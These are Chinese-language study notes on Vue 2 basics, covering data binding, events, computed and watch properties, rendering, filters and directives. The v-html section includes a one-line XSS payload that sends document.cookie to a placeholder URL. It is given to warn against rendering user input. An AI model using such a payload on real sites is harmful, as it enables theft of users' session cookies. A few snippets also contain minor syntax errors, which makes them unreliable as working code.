> [Vue3官网](https://cn.vuejs.org/) |   [Vue2官网](https://v2.cn.vuejs.org/v2/guide/) |  [BootCDN - 第三方js库](https://www.bootcdn.cn/)

## 1 搭建开发环境
> 此处使用 `<script>` 标签引入 `<html>` 文件中

### 1.1 引入 Vue
- CDN链接
```html
<script src="https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js"></script>
```
- 学习时建议使用“开发版本”，改版本包含调试信息

### 1.2 Hello World
```js
// 关闭生产版本警告
Vue.config.productionTip = false;
// 创建 Vue 实例 - 参数为配置对象
new Vue({
	el: '#root', // 为当前实例绑定容器，值为CSS选择器字符串 / document..
	data: {      // 数据，可以通过插值语法使用（仅绑定容器）
		name: 'seabee',
		age: 12
	}
})
```

- 插值语法
	- 在非绑定容器中，插值语法将被识别为字符串
	- 内容可以是任意**JS表达式**（包括三目表达式，`if / for` 语句）
	- 也可以在里面插入 `methods` 中定义的函数 
		- `{{showInfo}}`  将展示代码内容
		- `{{showInfo()}}` 将展示返回值
- 在 Vue 中，“容器 - 实例” 是 **1 to 1** 对应关系
	- `el` 所指向的容器中的代码被称为「Vue模版」
	- 当页面上存在**多个符合条件的模版**时，仅**首个**容器被正常解析
	- 当页面上存在**多个符合条件的Vue实例**时，仅**首个**实例正常接管

我们也可以不在配置项中声明 `el`：
```js
const vm = new Vue({
	data: {
		name: 'SeaBee',
		age: 12
	}
});
// 指定实例需要挂载的模版
vm.$mount('#root');
// 这种方式更加灵活，比如我们可以加一个 timer，延迟 1s 再进行挂载
setTimeout(() => {
	vm.$mount('#root');
}, 1000);
```

此外，我们也可以**函数式**的声明 `data`：

- 把 `data` 写成箭头函数 `() => {}` 时， `this` 指向 `window`
```js
new Vue({
	data: function() { // 此处的 this 是 Vue 实例对象
		return {       // 返回值是需要的数据对象
			name: 'SeaBee',
			age: 12
		}
	}
	// 也可以搞成这样
	data() {
		return {
			name: 'SeaBee',
			age: 12
		}
	}
});
```

## 2 模版语法

1. 插值语法 - 用于**标签体**内容

	把指定的值放到指定的位置，可以访问 Vue 实例上的**所有属性**
	
	事实上，我们在 `data` 中定义的所有数据最后都会跑到 Vue 实例上

1. 指令语法（以`v-` 开头）- 用于解析**标签**

	例如 ：`<a v-bind:href="url">` 此时双引号中的内容被作为JS表达式执行
	
	事实上，`v-bind:` 指令可以为任何标签属性动态绑定内容，可以简写为 `:`

## 3 数据绑定

### 3.1 单向数据绑定 v-bind
- 输入框内容改变不影响 `name` 的值
- `name` 内容改变会影响输入框文字变化
```html
<div id="root">
	单向数据绑定：<input type="text" v-bind:value="name">
	简写见右侧：<input type="text" :value="name">
</div>
```

### 3.2 双向数据绑定 v-model
- 输入框与 `name` 值互相影响
```html
<div id="root">
	双向数据绑定：<input type="text" v-model:value="name">
	简写见右侧：<input type="text" v-model="name">
</div>
```
- **不是所有**的元素都支持 `v-model` 指令（仅支持表单元素 - 有 `value` 属性）
- `v-model:value` 可以简写为 `v-model`  - 因为默认作用于 `value` 属性

### 表单数据收集

```html
// 创建表单
<div id="root">
	<form @submit.prevent="demo"> // 阻止提交后页面跳转
		<label for="demo">账号：</label>
		<input type="text" id="demo" v-model="account">
		<br>
		<label for="pwd">密码：</label>
		<input type="password" id="pwd" v-model="password">
		<br>
		<label for="sex">性别：</label>
		// 需要手动添加 value
		男：<input type="radio" name="sex" value="m" v-model="sex">
		女：<input type="radio" name="sex" value="f" v-model="sex">
		<br>
		<label for="hobby">爱好：</label>
		抽烟<input type="checkbox" value="smoke" v-model="hobby">
		喝酒<input type="checkbox" value="drink" v-model="hobby">
		烫头<input type="checkbox" value="hair"  v-model="hobby">
		<br>
		<label for="district">所属校区：</label>
		<select id="district" v-model="city">
			<option value="">请选择所属校区</option>
			<option value="zjg">紫金港</option>
			<option value="yq">玉泉</option>
			<option value="xx">西溪</option>
		</select>
		<br>
		<label for="info">附加信息：</label>
		<textarea id="info" v-model="other"></textarea>
		<br>
		<button>提交</button>
	</form>
</div>
```
```js
new Vue({
	el: '#root',
	data: {
		account: '',
		password: '',
		sex: '',
		hobby: [],
		city: '',
		other: ''
	},
	methods: {
		demo() {
			// console.log(JSON.stringify(this._data)); - 不推荐
			// 或者把现有 data 打包到 usr_into 对象中
		}
	}
})
```

- 获取数字（两者配合使用）
	- `type="number"`
	- `v-model.number="age"`
- `v-model.lazy` 可以在 **失去焦点** 时再进行收集（不是每次 `keydown`）
- `v-model.trim` 删去首尾空格

## 3 MVVM

- `M - Model` - 对应 `data` 中的数据
- `V - View` - 模版
- `VM - ViewModel` - Vue 实例对象（负责转接 V & M 之间的交互）

## 4 数据代理
> 使用某一个对象代理执行对另一个对象的 Read & Write 操作

```js
let var_1 = { x:100 }
let var_2 = { y:200 }
// 使用 var_2.x 对 var_1.x 的 查询&更改 操作进行代理
Object.defineProperty(var_2, 'x', {
	get() {
		return var_1.x;
	},
	set(val) {
		var_1.x = val;
	}
})
```

- `vm` 中包含的 `data` 都是通过数据代理实现的（源数据被存在了 `vm._data` ）

	其实只是让写插值语法的时候不用写成 `{{_data.name}}`

###  `Object.defineProperty()`

- 通过该方法定义的属性**不可以被枚举**
	默认不参与`Object.keys(obj_name)`或 `for(let key in obj)` 遍历
- 通过该方法定义的属性默认**不可以被动态修改**
- 通过该方法定义的属性默认**不可以被删除**
```js
let person = {
	name: '张三',
	sex: 'M'
};
// 为 person 添加属性 age，参数为(对象名，属性名，配置项)
Object.defineProperty(person, 'age', {
	value: 18,
	// 若希望该属性可被枚举，则应添加以下配置项
	enumerable: true,
	// 控制属性是否可以被修改
	writable: true,
	// 控制属性是否可以被删除
	configurable: true
})
```
- 通过该方法定义的属性**可以随变量动态变化** - 每次读取都重新调用 `get`
```js
Object.defineProperty(person, 'age', {
	get: function() {  // 返回值即为属性值
		return "hello" // 绑定定值
		return number  // 绑定变量
	}，
	set(value) {        // 有人修改时调用，且返回修改结果
		number = value; // 因为绑定了 number 变量，所以此处需要治本
	}
})
```

## 5 事件

### 5.1 事件处理

- 下面响应一个鼠标点击事件：
```html
// "showInfo" 即为回调函数名称
<button v-on:click="showInfo">点我显示信息</button>
// 下面是简写形式（传参）
<button @click="showInfo2(66)">点我显示信息</button> // 会丢失 event
// 保留 event 的书写形式
<button @click="showInfo2($event, 66)">点我显示信息</button>
```

- 回调函数应当定义在对应的Vue实例中：
```js
new Vue({
	methods: {
		showInfo(event) { // this 指向 Vue 实例（箭头函数指向 window）
			alert('欢迎新同学！');
		},
		// event.target 即为最初触发事件的目标，使用 innerText 可以获取标签内容
		showInfo2(e, number) { 
			// number = 66
		}
	}
})
```

### 5.2 事件修饰符

**阻止默认事件**

下面阻止一下 `<a>` 的默认点击跳转行为

- 一般来说，我们需要手动添加 `e.preventDefault()`
- 但是在 Vue 中，我们可以通过 `@click.prevent` 阻止默认行为

**阻止事件冒泡**
```html
<div @click="showInfo">
	// 默认情况下，点一次 button 会导致两次弹窗（冒泡）
	<button @click="showInfo">点我提示信息</button>
</div>
```

- 一般情况下手动添加 `e.stopPropagation()`
- 在 Vue 中，可以添加 `@click.stop`

- Vue 中总共有 6 个事件修饰符（前三个比较常用）
	- `prevent` - 阻止默认事件
	- `stop` - 阻止事件冒泡
	- `once` - 事件**只触发一次**
	- `capture` - 使用事件捕获模式，加在外层（由外向内处理事件）
	- `self` - 只有当 `e.target = current` 时执行
	- `passive` - 立即执行默认行为（无需等待回调函数结束）
- 修饰符也可以连用  `@click.stop.prevent="func"`（由左向右执行）

> 滚动事件分为以下两类：会先执行回调，再执行滚动条滚动
> 
> - `@scroll` - 鼠标滚轮 / 方向键（滚到边界后不触发）
>-  `@wheel` - 仅鼠标滚轮（滚到底还会触发）

### 5.3 键盘事件
> 一般分为 `@keydown` & `@keyup` 两类

```html
<input type="text" placeholder="按回车提示输入" @keyup="showInfo">
// 在 Vue 中我们这么干：@key.enter="showInfo"
```
```js
methods: {
	showInfo(e) {
		// if(e.keyCode !== 13) return; 一般来说这么干
		console.log(e.target.value);
	}
}
```

- Vue 中拥有别名的按键共有9个
	1. `enter` - 回车
	2. `delete` - 删除 / 退格
	3. `esc` - 退出
	4. `space` - 空格
	5. `tab` - 换行（会切换焦点，得用 `@keydown`）
	6. 方向键：`up`， `down`，`left`，`right`
- 未提供别名的按键可以
	- 使用标准名称 `e.key` 绑定 （需要转换大驼峰为 `CapsLock -> caps-lock`）
	- **不推荐**使用原始键值 `e.keyCode` 绑定 - `@keydown.13="func"`
- 系统修饰符 `ctrl` , `alt` ,`shift`,`meta`（Win / Command）
	- `@keyup` - 按下修饰键+按下其他键 -> 抬起其他键 -> 触发
	- `@keydown` - 正常触发
	- 监听组合键 `ctrl + y` - `@keyup.ctrl.y` （一定要 up）
- 我们也可以通过 `Vue.config.keyCodes.自定义键名 = keyCode` 定制别名

## 6 计算属性 `computed`
> 对 `data` 中已经存在的属性字段进行加工计算得到的新属性 

- 计算属性不存在于 `vm._data` 字段中（是通过后续计算得到的）
- `computed` 属性与 `data` 一样可以应用于插值语法中
```js
new Vue({
	...,
	data: {
		firstName: 'Bee',
		lastName: 'Sea'
	},
	computed: { // 定义计算属性
		fullName: {
			get() { // 初次读取 / 依赖数据变化 时调用（有数据缓存）
				return this.firstName + '-' + this.lastName;
				// 一定要加 this 指针
			},
			set(value) { // 非必需，不需要修改的属性就不用写 setter 了
				const arr = value.split('-');
				this.firstName = arr[0];
				this.lastName = arr[1];
			}
		},
		// 只读情况下可以简写为以下形式
		fullName: function() { // 充当 getter
			return this.firstName + '-' + this.lastName;
		}
	}
})
```

## 7 监视属性
> `computed` 不能异步返回数据（因为靠的是返回值）
> 
> `watch` 可以异步返回数据（中间夹一个 timer ）

- 普通属性 & 计算属性 均可以被监视
```js
const vm = new Vue({
// way-1: 通过配置项 watch
	...,
	data: { isHot:false },
	watch: { // 监视对象: handler()
		isHot: {
			immediate: true, // 初始化时也调用 handler
			handler(new_val, old_val) { // isHot 被修改时调用
				// 可以获取到新旧两个值
			}
		}
	}
});
// way_2: 通过 vm
vm.$watch('isHot', {
	immediate: true,
	handler(new_val, old_val) {}
});
// 简写形式（仅 handler）
watch: {
	isHot(newVal, oldVal) {}
}
vm.$watch('isHot', function(newVal, oldVal){}) // 不能用箭头函数
```

- 深度监视 - 监视套娃属性
```js
new Vue({
	data: {
		numbers: {
			a: 1,
			b: 2
		}
	},
	watch: {
		'numbers.a': { handler(newVal, oldVal){} }, // 必须加单引号
		 numbers: { 
			deep: true, // 开启深度监视 - 任何分量改变均触发
			handler(newVal, oldVal){}
		}
	}
})
```

## 8 样式绑定

- 绑定 `class` 样式（动态指定类）

	点击标签后，`div.basic.normal -> div.basic.happy`
	
	Vue 会把 `class` （静态）+ `:class` （动态）进行拼合
```html
// 单个 + 名字不确定
<div class="basic" :class="cls" @click='alter'>{{name}}<div>
// 多个 + 名字&数量不确定：操作 arr 数组即可动态 添加/移除 类
<div class="basic" :class="arr" @click='alter'>{{name}}<div>
// 多个 + 名字&个数确定，但不知道具体用哪个
<div class="basic" :class="clsObj" @click='alter'>{{name}}<div>
```
```js
new Vue({
	data: { 
		cls:'normal',
		arr: ['cls1', 'cls2', 'cls3'],
		clsObj: { // false - 弃用，true - 启用
			normal: false,
			happy: true,
			sad: false
		}
	},
	methods: {
		alter() {
			const arr = ['normal', 'happy', 'sad'];
			this.mood = arr[Math.floor(Math.random()*3)];
		}
	}
})
```

- 绑定 `style` 样式（內联样式）
```html
// 这里的 style 整体是一个 object
<div :style="{fontSize: ftsize+'px';}"></div>
// 也可以直接把这个对象单独拎出来
<div :style="styleObj"></div>
// 丧心病狂的数组大法 - 可以堆多个样式对象
<div :style="[styleObj, styleObj2]"></div>  // 会把两个对象里的样式加起来
```
```js
new Vue({
	data: {
		ftsize: 40,
		styleObj: {
			fontSize: '40px'
		},
		styleObj2: {
			backgroundColor: 'orange'
		}
	}
})
```

## 9 渲染

### 9.1 条件渲染

1. `v-show` -> 隐藏时调整为 `display: none`
	- 可以直接是布尔值：`v-show="false / true"`
	- 或者任何结果为布尔值的表达式：`v-show="1 === 3"`
	- 或者是一个布尔类型的变量：`v-show="a" & a:false`
2. `v-if` -> 隐藏时从 DOM 中移除代码
	可填写类型与 `v-show` 一致
	- 多分支 `v-else-if` `v-else`
	- 一组分支判断之间不能用其他标签打断
	- 批量实现一堆标签的显隐判断时，可以采用 `<template>` 进行包裹（不影响样式）
```html
// 只能使用 v-if 不能使用 v-show
<template v-if="n === 1">
	<h2>Title1</h2>
	<h2>Title2</h2>
	<h2>Title3</h2>
</template>
```

Tip

- 频繁切换 - `v-show`
- 多分支判断 -`v-if`

### 9.2 列表渲染
```html
<div id="root">
	%%遍历数组%%
	<ul>
		<li v-for="p in persons" :key="p.id">{{p.name}}-{{p.age}}</li>
		// 事实上可以这样 v-for="(item, index) in arr"
	</ul>
	%%遍历对象%%
	<ul>
		<li v-for="(val,key) in car" :key="key">{{key}}-{{val}}</li>
	</ul>
	%%遍历字符串%%
	<ul>
		<li v-for="(char, idx) in str" :key="idx">{{idx}}-{{char}}</li>
	</ul>
</div>
```
```js
new Vue({
	el: '#root',
	data: {
		persons: [
			{ id: 1, name: 'zhangsan', age: 18},
			{ id: 2, name: 'lisi',     age: 19},
			{ id: 3, name: 'wangwu',   age: 20}
		],
		car: {
			name: 'Audi',
			price: '78w',
			color: 'blue'
		},
		str: 'I can eat glass, it does not hurt me.'
	}
})
```

#### key
没有显示指定 key 时，Vue 默认使用 `index` 作为 `id`，
当不存在对数据进行逆序添加/删除等破坏顺序的操作时，使用 `index` 作为 key 是可以的

1. 使用数组下标 `index` 作为 key
	1. 根据初始数据生成虚拟 DOM
	2. 虚拟 DOM 转换为真实 DOM
	3. 用户操作真实 DOM
	4. 插入新数据，并生成新的虚拟 DOM
	5. 进行新旧虚拟 DOM 对比：无法无用的部分重新生成，相同的组件进行复用
	      可能导致输入残留
2. 使用 `id` 作为 key
	5. 虚拟对比依据：`key` 相同的记录两两对比，不存在的就新建真实 DOM

#### 列表过滤（搜索）

首先，我们通过 `v-model` 动态收集用户输入 `<input type="text" v-model="keyWord>"`

随后，通过 `watch` 进行数据监视：
```js
watch: {
	keyWord: {
		immediate: true, // 防止刚开始没数据（反正所有字符串都包含空串）
		handler(new_val) {
			// 因为直接操作 persons 会导致数据丢失，所以此处操作 filtered
			this.filtered = this.persons.filter((p)=>{
			return p.name.indexOf(new_val) !=== -1; // p.name 包含 new_val
		})
	}
}
```

我们也可以使用 `computed` 进行实现：
```js
computed: {
	filtered() {
		return this.persons.filter((p) => {
			return p.name.indexOf(this.keyWord) !== -1;
		})
	}
}
```

#### 列表排序

此处我们实现一下对记录年龄的 升序`1` / 降序`2` / 原序`0` 切换，使用 `sortType` 进行记录

过滤、排序不分家，此处我们继续对 `filtered` 进行迭代
```js
computed: {
	filtered() {
		const arr =  this.persons.filter((p) => {
			return p.name.indexOf(this.keyWord) !== -1;
		})
		// 判断是否需要排序
		if(this.sortType) {
			arr.sort((p1, p2) => {
				return this.sortType === 1 ? p1.age-p2.age : p2.age-p1.age;
			})
		}
		return arr
	}
}
```

#### Vue.set()
> 使得实例构建完成后追加的属性也能拥有 getter & setter

`Vue.set(vm.obj, 'name', 'val') / vm.$set(vm.obj, 'name', 'val')`

- `Vue.set / vm.$set()` **不能** 作用于 `vm / vm._data`

#### 数组监测

在 Vue 中使用以下七种方式对数组进行操作时，可以自动检测到数组的变化：
`push` `pop`  `shift` `unshift` `splice` `sort` `reverse`（这些方法都被包裹过）

直接通过下标对其进行操作时，不受监控（但可以修改）

`filter()` `concat()` `slice()` 不会变更原数组（只是返回新数组），此时我们可以使用新数组替换原数组

#### 数据监测原理

我们使用原生 JS 来实现一下：
```js
let data = {
	name: 'SeaBee',
	addr: 'HangZhou'
};
// 创建监视实例对象，用于监视 data 中属性的变化
const obs = new Observer(data);
function Observer(obj) {
	// 汇总对象中的所有属性，形成一个数组
	const keys = Object.keys(obj);
	// 遍历
	keys.forEach((k) => {
		// 此处的 this 指向 Observer 实例对象
		Object.defineProperty(this, k, {
			get() { return obj[k] },
			set(val) { obj[k] = val }
		})
	})
}
```

## 10 过滤器
> 对数据进行格式化后再进行显示
> 
> 没有改变原来的数据，只是进行了一些加工

下面以格式化时间为例：
```html
<div>当前时间为{{time | timeFormater}}</div>
// 也可以为 timeFormatter 传参数（格式化模版字符）
<div>当前时间为{{time | timeFormater('YYYY_MM_DD')}}</div>
// 多个过滤器之间可以串联
<div>当前时间为{{time | timeFormater('YYYY_MM_DD') | mySlice}}</div>
```
```js
new Vue({
	data: {
		time: 0 // 时间戳
	},
	filters: { // 把 time 传入 formater，最后以 formater 的返回值作为插值结果
		timeFormater(val, str='YYYY-MM-DD HH:mm:ss') { // 指定 str 的默认值
		// 此处使用 day.js 进行实现
			return dayjs(val).format(str);
		},
		mySlice(val) {
			return val.slice(0,4);
		}
	}
})
```

上述方法配制的是局部过滤器。

我们可以使用 `Vue.filter('name', function() {})` 配置**全局过滤器**

-> 这一操作需要在 `new Vue` 之前执行

## 11 内置指令
### v-text
> 向所在的标签插入文本 -> 意思是不如插值语法

```html
<div v-text="name">hello world！</div>
```

- `v-text` 会用变量值**完全替换**标签的文本内容（悲）
    所以说 “hello world！”就这么消失不见哩
- 此外，所有内容都会被当成**文本内容**进行解析
    使用该指令往里面丢标签的梦想破灭哩

### v-html
> 向所在标签中插入文本（可以插入标签诶！）

```html
name: "<h3>你好哇！</h3>"
<div v-html="name">hello world！</div>
-> 结果就是 <div> 里面套了一层 <h3>
```

但是该命令存在安全性问题：

  使用 `<a href=javascript:location.href="url"?+document.cookie>`  就能拿到这个浏览器下的所有 **非HTTP-only-Cookie**
  
  **不要用在用户输入上！！！可能导致 XSS 攻击！！！**

### v-cloak
> 处理 JS 脚本加载时的阻塞问题
> 
> 在 Vue 实例加载完成后将自动移除所有元素的 `v-cloak` 属性

配合一下 CSS 选择器，我们就可以隐藏所有渲染失败的差值语法组件 orz
```html
<style>
	[v-cloak] { display: none; }
</style>
<h2 v-cloak>{{name}}</h2>
```

### v-once
> 初次动态渲染，之后视为静态内容（只渲染初值）

数据的后续变动将不会引起 `<v-once>` 所在结构的更新，可用于优化性能

### v-pre
> 是所在节点跳过编译过程
> 可用于：没有指令语法、插值语法的节点，加快编译速度

## 12 自定义指令
> 分为 对象式 & 函数式，对象式 = bind + update

- 如果指令名为多个单词，则应使用 `kebab-case` 命名法，即将 `bigNumber` 转变为 `big-number`
- `this` 指向 `window`

### v-big
> 类似于 `v-text` 但自动将数值放大十倍

```js
new Vue({
	directives: { // 配置自定义指令
		big: {}, // 配置为对象
		// 1.指令与元素成功绑定 2.指令所在的模版被重新解析时，都调用该函数
		big: function(el, bind) { // 配置为函数, el 为真实 DOM 的 <span> 标签
			el.innerText = bind.value * 10; // 手动操作 DOM 元素
		} 
	}
})
```

### v-fbind
> 类似于 `v-bind` ，但是默认为所绑定的 `<input>` 获取焦点

```js
fbind(el, bind) {
	el.value = bind.value;
	el.focus();          // 执行时机不对：只有元素进入页面才生效 -> 必须配置成对象
},
fbind: { // bind & update 的逻辑往往相同
	bind(el, binding){       // 指令与元素成功绑定
		el.value = binding.value;
	},     
	inserted(){              // 指令所在元素被插入页面
		el.focus();
	}, 
	update(){                // 指令所在模版被重新解析
		el.value = binding.value;
	}
}
```

### 全局自定义指令

```js
Vue.directive('name', {
	// 配置对象
})
```